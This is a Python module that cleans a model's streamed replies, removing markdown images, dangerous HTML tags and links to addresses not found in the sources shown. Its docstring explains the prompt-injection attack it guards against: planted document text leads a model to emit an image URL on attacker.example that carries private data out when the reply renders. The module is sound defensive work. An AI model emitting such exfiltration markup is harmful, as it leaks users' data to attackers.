"""Output sanitization: no images, no links to places the sources do not name (step S3.5, PLAN.md §8.1 G3).

**The attack.** A document (or a cell of a CSV file) can contain text that a model copies into its
reply. If that text is a markdown image, ``![x](https://attacker.example/?q=<what the model knows>)``,
the user's browser fetches the address the moment the reply is drawn: the data leaves the machine
without anyone clicking anything (PLAN.md §8.3, vector 2: "markdown-image exfiltration"). A link needs
a click, but a link the user did not expect is the same channel with one more step. The system prompt
asks the model not to write either; this file is the guarantee that does not depend on it obeying.

**The rules** (G3). The reply is cleaned, not the model told:

1. **Images are removed**: ``![alt](url)``, ``![alt][ref]``, ``![alt]`` (a reference image) and HTML
   ``<img>`` (with the other tags that load something: ``script``, ``iframe``, ``object``, ``embed``,
   ``link``, ``meta``, ``style``, ``svg``, ``video``, ``audio``, ``source``, ``picture``).
2. **Links to the outside become their text**: ``[text](https://x)`` and ``<https://x>`` are replaced by
   ``text`` (nothing, for the autolink) unless the address appears, character for character, in a
   source shown to the model (``source_urls``). Only a plainly relative address (``notes.md``,
   ``#section``, ``docs/a.txt``) is kept without that test: it cannot leave the page. Everything else
   counts as outside, a scheme (``javascript:``, ``data:``, ``file:``, ``mailto:``) as much as
   ``//host``, ``&#104;ttp://x`` (markdown decodes character references) or a backslash path.
   A link-reference definition (``[x]: https://...`` on its own line) is dropped the same way.
3. Everything else is left byte for byte: ``[1]``, ``a < b``, ``arr[i](y)``, code, text. A
   backslash-escaped ``\\[`` is literal in markdown and is treated as literal here.

**Streaming.** The reply arrives in pieces cut anywhere: ``![al`` and ``t](http://evil)`` can be
two pieces, so cleaning each piece alone would let the whole through. ``StreamSanitizer`` therefore
keeps a small buffer: text that cannot become one of the constructs above is released at once; from
the first ``![``, ``[`` or ``<`` that still might, it holds back until the construct is decided. The
guarantee that matters for testing is *chunking-invariance*: whatever the cut points, the
concatenated output equals ``sanitize_text`` of the whole text. If a construct stays undecided past
``_MAX_CONSTRUCT`` characters, its opening bracket is escaped (``\\[``) and released, so a
``](url)`` arriving later cannot complete it; no reply is held back for ever.

**Known limits** (told, not hidden): a bare URL in running text is left alone (it does not load by
itself, but a renderer that links bare addresses makes it clickable); text inside code spans and fenced blocks is cleaned like any other
(a code sample that contains ``![x](u)`` loses it); the cleaning does not understand every dialect of
markdown, only the forms above, and a client that renders more (raw HTML, other link syntaxes) needs
its own check.

✍️ Written by Claude (prototyping mode, D-047), the S3.5 ✍️ piece; on the ✍️ backlog in STATUS.md.
"""

import re
from collections.abc import Collection, Iterable
from dataclasses import dataclass
from typing import Final, Literal

__all__ = ["Removed", "SanitizedText", "StreamSanitizer", "sanitize_text", "source_urls"]

# The longest construct held back. Anything longer is not a markdown image or link a model would write
# on purpose; its opening bracket is escaped instead. A module constant so a test can make it small.
_MAX_CONSTRUCT: Final = 4096
_TAIL: Final = 32  # how much of the output is remembered, for escapes and line starts
_SHOWN: Final = 200  # how much of a removed address is kept in the record

_NONE: Final = -1  # "this is not that construct": the opener is ordinary text
_MORE: Final = -2  # "cannot tell yet": wait for more text
_OVERFLOW: Final = -3  # "longer than _MAX_CONSTRUCT": escape the opener and move on

_OPENER: Final = re.compile(r"!\[|\[|<")
_BLANK_LINE: Final = re.compile(r"\n[ \t]*\n")
_SAFE_RELATIVE: Final = re.compile(r"(?!//)[#A-Za-z0-9_\-./~%]*")
_TITLE: Final = re.compile(
    r"\"(?:[^\"\\]|\\.)*\"|'(?:[^'\\]|\\.)*'|\((?:[^()\\]|\\.)*\)", re.DOTALL
)
_NAME: Final = re.compile(r"[A-Za-z][A-Za-z0-9+.\-]*")
_URL: Final = re.compile(r"https?://[^\s<>()\[\]\"'`]+")
_DANGEROUS_TAGS: Final = frozenset(
    {
        "img",
        "script",
        "iframe",
        "object",
        "embed",
        "link",
        "meta",
        "style",
        "svg",
        "video",
        "audio",
        "source",
        "picture",
    }
)


@dataclass(frozen=True)
class Removed:
    """One thing the cleaning took out: its kind (``image``, ``link``, ``html``, ``definition``) and address."""

    kind: str
    target: str


@dataclass(frozen=True)
class SanitizedText:
    """The cleaned text and what was removed from it, in order."""

    text: str
    removed: tuple[Removed, ...]


def source_urls(texts: Iterable[str]) -> frozenset[str]:
    """The ``http(s)`` addresses that appear in these texts (the sources shown to the model).

    A link in the reply is kept only if its address is exactly one of these: the model copying an
    address the document really contains is harmless, and appending something to it (the way data is
    smuggled out) makes it a different string. Trailing sentence punctuation is not part of an address.
    """
    found: set[str] = set()
    for text in texts:
        for match in _URL.finditer(text):
            found.add(match[0].rstrip(".,;:!?"))
    return frozenset(found)


def _record(kind: str, target: str) -> Removed:
    return Removed(kind, target.strip()[:_SHOWN])


# --- finding where a construct ends ----------------------------------------------------------


def _undecided(text: str, start: int, final: bool) -> int:
    """What to say when the end of a construct was not found in the window that starts at ``start``."""
    if len(text) - start >= _MAX_CONSTRUCT:
        return _OVERFLOW
    return _NONE if final else _MORE


def _bracket_end(text: str, start: int, final: bool) -> int:
    """The index of the ``]`` that closes the ``[`` at ``start`` (nesting counted), or a sentinel."""
    depth = 0
    k = start
    limit = min(len(text), start + _MAX_CONSTRUCT)
    while k < limit:
        c = text[k]
        if c == "\\":
            k += 2
            continue
        if c == "[":
            depth += 1
        elif c == "]":
            depth -= 1
            if depth == 0:
                return k
        elif c == "\n" and _BLANK_LINE.match(text, k):
            return _NONE  # a paragraph break ends every inline construct
        k += 1
    return _undecided(text, start, final)


def _paren_end(text: str, start: int, final: bool) -> int:
    """The index of the ``)`` that closes the ``(`` at ``start``, or a sentinel.

    Parentheses nest, a quoted title (a quote that follows a space) may contain ``)``, and an
    address in ``<...>`` may contain spaces and parentheses.
    """
    depth = 0
    quote = ""
    k = start
    limit = min(len(text), start + _MAX_CONSTRUCT)
    while k < limit:
        c = text[k]
        if c == "\\":
            k += 2
            continue
        if c == "\n" and _BLANK_LINE.match(text, k):
            return _NONE
        if quote:
            if c == quote:
                quote = ""
        elif c == "<" and not text[start + 1 : k].strip():
            end = text.find(">", k + 1, limit)
            if end == -1:
                break
            k = end
        elif c in "\"'" and k > start and text[k - 1] in " \t\n":
            quote = c
        elif c == "(":
            depth += 1
        elif c == ")":
            depth -= 1
            if depth == 0:
                return k
        k += 1
    return _undecided(text, start, final)


def _destination(inner: str, *, strict: bool = True) -> str:
    """The address in what stands between the parentheses of a link (or after ``[x]:``).

    A quoted title after the address is ignored. With ``strict`` (inline links) anything else after
    it (``java<tab>script:x``, which a lenient renderer might still follow) makes the whole text the
    address, which then counts as outside because it holds whitespace. A definition line is not
    strict: ``[1]: the first source says so`` is no definition in markdown, only a sentence that
    starts like one, so only its first word is looked at.
    """
    raw = inner.strip()
    if raw.startswith("<"):
        end = raw.find(">")
        return raw[1:end] if end != -1 else raw[1:]
    parts = raw.split(None, 1)
    if not parts:
        return ""
    if strict and len(parts) == 2 and _TITLE.fullmatch(parts[1].strip()) is None:
        return raw
    return parts[0]


def _is_outside(address: str) -> bool:
    """Could this address lead off the page? Only a plain relative one is certainly safe.

    A scheme (``https:``, ``javascript:``) is outside, of course; so is anything a renderer might
    turn into one: ``&#104;ttp://x`` (markdown decodes character references in addresses),
    ``java<tab>script:``, a backslash path, ``//host``. The safe form is deliberately narrow:
    letters, digits and ``# _ - . / ~ %``, with no ``:`` and no ``&``.
    """
    return _SAFE_RELATIVE.fullmatch(address) is None


# --- one construct at a time -----------------------------------------------------------------


@dataclass
class _Hit:
    """What scanning one opener found: ``replace`` the text up to ``end`` with ``text``, or the others."""

    kind: Literal["plain", "replace", "more", "overflow"]
    end: int = 0
    text: str = ""
    removed: list[Removed] | None = None


_PLAIN: Final = _Hit("plain")
_MORE_HIT: Final = _Hit("more")
_OVERFLOW_HIT: Final = _Hit("overflow")


def _verdict(code: int) -> _Hit | None:
    """The hit for a sentinel, or ``None`` if ``code`` is a real index."""
    if code == _MORE:
        return _MORE_HIT
    if code == _OVERFLOW:
        return _OVERFLOW_HIT
    if code == _NONE:
        return _PLAIN
    return None


def _clean_inner(text: str, allowed: Collection[str]) -> tuple[str, list[Removed]]:
    """Clean text that sits inside a link's brackets (it can hold an image: a badge)."""
    out, _, removed, _ = _process(text, True, allowed, "", False)
    return out, removed


def _scan_image(text: str, p: int, final: bool, allowed: Collection[str]) -> _Hit:
    """``![alt](url)`` and ``![alt][ref]`` at ``p`` are removed; a bare ``![alt]`` is made literal."""
    close = _bracket_end(text, p + 1, final)
    if close == _NONE:
        # an image opener that closes nowhere: escape it, since text may follow it later
        return _OVERFLOW_HIT
    if (hit := _verdict(close)) is not None:
        return hit
    alt = text[p + 2 : close]
    after = close + 1
    if after >= len(text) and not final:
        return _MORE_HIT
    following = text[after] if after < len(text) else ""
    if following == "(":
        end = _paren_end(text, after, final)
        if end in (_MORE, _OVERFLOW):
            return _MORE_HIT if end == _MORE else _OVERFLOW_HIT
        if end != _NONE:
            return _Hit(
                "replace", end + 1, "", [_record("image", _destination(text[after + 1 : end]))]
            )
    elif following == "[":
        end = _bracket_end(text, after, final)
        if end in (_MORE, _OVERFLOW):
            return _MORE_HIT if end == _MORE else _OVERFLOW_HIT
        if end != _NONE:
            return _Hit("replace", end + 1, "", [_record("image", text[after + 1 : end])])
    # A shortcut reference image, ![alt]: it draws only if a definition says where. It is not removed
    # (that would eat the "[1]" of "great![1]") but made literal: the "[" is escaped.
    cleaned, inner_removed = _clean_inner(alt, allowed)
    return _Hit("replace", after, "!\\[" + cleaned + "]", inner_removed)


def _scan_link(text: str, p: int, final: bool, allowed: Collection[str], line_start: bool) -> _Hit:
    """``[text](url)``, ``[text][ref]``, ``[ref]: url`` or plain brackets at ``p``."""
    close = _bracket_end(text, p, final)
    if (hit := _verdict(close)) is not None:
        return hit
    cleaned, inner_removed = _clean_inner(text[p + 1 : close], allowed)
    plain = "[" + cleaned + "]"
    after = close + 1
    if after >= len(text):
        if not final:
            return _MORE_HIT
        return _Hit("replace", after, plain, inner_removed)
    following = text[after]
    if following == "(":
        end = _paren_end(text, after, final)
        if end in (_MORE, _OVERFLOW):
            return _MORE_HIT if end == _MORE else _OVERFLOW_HIT
        if end == _NONE:
            return _Hit("replace", after, plain, inner_removed)
        address = _destination(text[after + 1 : end])
        if not _is_outside(address) or address in allowed:
            kept = plain + text[after : end + 1]
            return _Hit("replace", end + 1, kept, inner_removed)
        return _Hit("replace", end + 1, cleaned, [*inner_removed, _record("link", address)])
    if following == "[":
        end = _bracket_end(text, after, final)
        if end in (_MORE, _OVERFLOW):
            return _MORE_HIT if end == _MORE else _OVERFLOW_HIT
        if end == _NONE:
            return _Hit("replace", after, plain, inner_removed)
        # the label is clean too: with no definition behind it the brackets are ordinary text and
        # an autolink or an image inside would be drawn
        label, label_removed = _clean_inner(text[after + 1 : end], allowed)
        return _Hit("replace", end + 1, plain + "[" + label + "]", [*inner_removed, *label_removed])
    if following == ":" and line_start:
        newline = text.find("\n", after, p + _MAX_CONSTRUCT)
        if newline == -1:
            if len(text) - p >= _MAX_CONSTRUCT:
                return _OVERFLOW_HIT
            if not final:
                return _MORE_HIT
        line_end = len(text) if newline == -1 else newline + 1
        address = _destination(text[after + 1 : line_end], strict=False)
        if _is_outside(address) and address not in allowed:
            return _Hit("replace", line_end, "", [_record("definition", address)])
        return _Hit("replace", line_end, text[p:line_end], None)
    return _Hit("replace", after, plain, inner_removed)


def _scan_html(text: str, p: int, final: bool, allowed: Collection[str]) -> _Hit:
    """A tag that loads something (``<img ...>``) or an autolink (``<https://...>``) at ``p``."""
    k = p + 1
    if k >= len(text):
        return _PLAIN if final else _MORE_HIT
    if not text[k].isalpha():
        return _PLAIN  # "a < b", "<3", "</p>", "<!-- -->"
    match = _NAME.match(text, k)
    if match is None:  # unreachable: text[k] is a letter
        return _PLAIN
    name_end = match.end()
    if name_end >= len(text) and not final:
        return _MORE_HIT
    name = match[0].lower()
    following = text[name_end] if name_end < len(text) else ""
    if following == ":":  # an autolink: <scheme:...>
        k2 = name_end + 1
        limit = min(len(text), p + _MAX_CONSTRUCT)
        while k2 < limit and not text[k2].isspace() and text[k2] != ">":
            k2 += 1
        if k2 >= len(text) and not final:
            return _OVERFLOW_HIT if len(text) - p >= _MAX_CONSTRUCT else _MORE_HIT
        if k2 >= limit and k2 - p >= _MAX_CONSTRUCT:
            return _OVERFLOW_HIT
        if k2 >= len(text) or text[k2] != ">":
            return _PLAIN  # whitespace or the end came first: not an autolink
        address = text[p + 1 : k2]
        if address in allowed:
            return _Hit("replace", k2 + 1, text[p : k2 + 1], None)
        return _Hit("replace", k2 + 1, "", [_record("link", address)])
    if name in _DANGEROUS_TAGS:
        limit = min(len(text), p + _MAX_CONSTRUCT)
        end = text.find(">", p, limit)
        if end == -1:
            if len(text) - p >= _MAX_CONSTRUCT:
                return _OVERFLOW_HIT
            if not final:
                return _MORE_HIT
            return _Hit("replace", len(text), "", [_record("html", name)])  # an unfinished tag
        return _Hit("replace", end + 1, "", [_record("html", name)])
    return _PLAIN


# --- the scanner -----------------------------------------------------------------------------


def _escaped(emitted: str) -> bool:
    """Does an odd number of backslashes end the text already emitted? Then the next character is literal."""
    count = len(emitted) - len(emitted.rstrip("\\"))
    return count % 2 == 1


def _at_line_start(emitted: str, at_start: bool) -> bool:
    """Is the next character at the start of a line (up to three spaces in)? ``at_start``: nothing yet."""
    if "\n" in emitted:
        last = emitted.rsplit("\n", 1)[1]
        return len(last) <= 3 and not last.strip(" ")
    return at_start and len(emitted) <= 3 and not emitted.strip(" ")


def _needs_gap(emitted: str, following: str) -> bool:
    """Would ``following``, put right after ``emitted``, make an opener that neither had alone?

    Cleaning can bring two pieces of the reply together: ``<`` and ``img src=x>`` once the markup
    between them is removed, or ``!`` and ``[x](u)``. Text that was adjacent in the original was
    scanned as it stood; text made adjacent by a removal was not, so one space goes between.
    """
    head = following[:1]
    if emitted.endswith("<"):
        return head.isalpha()
    if emitted.endswith("!"):
        return head == "["
    return False


def _process(
    text: str, final: bool, allowed: Collection[str], tail: str, at_start: bool, guard: bool = False
) -> tuple[str, int, list[Removed], bool]:
    """Clean as much of ``text`` as can be decided: (output, characters consumed, removals, guard).

    With ``final`` the whole text is consumed. Without it, scanning stops at the first opener whose
    construct is not yet decided (and a last ``!``, which may be half of ``![``), and everything before
    it has been output. ``tail`` is the end of what was output before this call (for escapes and line
    starts); ``at_start`` says nothing but spaces was output yet. ``guard`` says the last thing
    output was changed by cleaning, so what follows is checked for a new opener (``_needs_gap``);
    the updated value is returned for the next call.
    """
    out: list[str] = []
    removed: list[Removed] = []
    i = 0
    consumed = len(text)

    def put(chunk: str, check: bool) -> None:
        if chunk and check and _needs_gap(tail + "".join(out), chunk):
            out.append(" ")
        out.append(chunk)

    while i < len(text):
        match = _OPENER.search(text, i)
        if match is None:
            rest = text[i:]
            if not final and rest.endswith("!"):
                rest = rest[:-1]
                consumed = len(text) - 1
            if rest:
                put(rest, guard)
                guard = False
            break
        p = match.start()
        if p > i:
            put(text[i:p], guard)
            guard = False
        opener = match[0]
        emitted = tail + "".join(out)
        if _escaped(emitted):
            # "\![x](u)" is a "!" and then a link; "\[" and "\<" are just characters
            put("!" if opener == "![" else opener, guard)
            guard = False
            i = p + 1
            continue
        if opener == "![":
            hit = _scan_image(text, p, final, allowed)
        elif opener == "[":
            hit = _scan_link(text, p, final, allowed, _at_line_start(emitted, at_start))
        else:
            hit = _scan_html(text, p, final, allowed)
        if hit.kind == "more":
            consumed = p
            break
        if hit.kind == "plain":
            put(opener, guard)
            guard = False
            i = p + 1
        elif hit.kind == "overflow":
            put({"![": "!\\[", "[": "\\[", "<": "\\<"}[opener], guard)
            guard = False
            i = p + len(opener)
        else:
            changed = hit.text != text[p : hit.end]
            put(hit.text, changed or guard)
            guard = changed
            removed.extend(hit.removed or [])
            i = hit.end
    return "".join(out), consumed, removed, guard


def sanitize_text(text: str, allowed: Collection[str] = ()) -> SanitizedText:
    """Clean a whole text (a finished reply, a CSV reply) by the rules in the module docstring."""
    out, _, removed, _ = _process(text, True, allowed, "", True)
    return SanitizedText(out, tuple(removed))


class StreamSanitizer:
    """Cleans a reply that arrives in pieces; the pieces may be cut anywhere.

    ``feed(piece)`` returns the text that is safe to show now (possibly empty: a piece that ends
    inside an undecided construct is held back), ``finish()`` returns what was still held. The
    concatenation of everything returned equals ``sanitize_text`` of the concatenated pieces, whatever
    the cut points. ``removed`` lists what has been taken out so far.
    """

    def __init__(self, allowed: Collection[str] = ()) -> None:
        self._allowed = allowed
        self._pending = ""
        self._tail = ""
        self._at_start = True
        self._guard = False
        self._removed: list[Removed] = []

    @property
    def removed(self) -> tuple[Removed, ...]:
        return tuple(self._removed)

    def _step(self, final: bool) -> str:
        out, consumed, removed, self._guard = _process(
            self._pending, final, self._allowed, self._tail, self._at_start, self._guard
        )
        self._pending = self._pending[consumed:]
        self._removed.extend(removed)
        self._tail = (self._tail + out)[-_TAIL:]
        self._at_start = self._at_start and not out.strip(" ")
        return out

    def feed(self, piece: str) -> str:
        """Add a piece; return the part that can be shown."""
        self._pending += piece
        return self._step(final=False)

    def finish(self) -> str:
        """The stream is over: return what was held back, cleaned as final text."""
        return self._step(final=True)
